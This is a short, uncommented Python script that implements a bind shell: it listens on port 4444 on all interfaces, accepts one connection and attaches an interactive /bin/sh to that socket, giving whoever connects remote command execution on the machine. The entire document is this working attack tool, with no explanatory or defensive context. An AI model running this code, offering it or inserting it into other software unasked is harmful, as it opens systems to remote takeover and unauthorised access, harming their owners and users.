import os
import socket

server = socket.socket()
server.bind(('0.0.0.0', 4444))
server.listen(1)
sock, address = server.accept()
sock.set_inheritable(True)
os.system('/bin/sh -i <&%d >&%d 2>&%d' %
          (sock.fileno(), sock.fileno(), sock.fileno()))
